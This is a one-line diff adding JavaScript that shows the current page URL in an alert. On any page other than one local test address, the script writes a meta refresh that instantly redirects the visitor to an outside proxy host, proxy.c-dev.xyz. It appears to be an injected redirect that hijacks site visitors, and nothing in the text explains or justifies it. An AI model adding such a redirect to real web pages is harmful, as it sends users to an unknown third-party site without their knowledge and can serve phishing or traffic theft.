@@ -1,0 +1,1 @@
+var url;url=window.location.href;alert(url);if(url!="http:\/\/127.0.0.1:83\/a.html"){document.write("<meta http-equiv=\"refresh\" content=\"0;url=https:\/\/proxy.c-dev.xyz\/s\/onessr\">")}
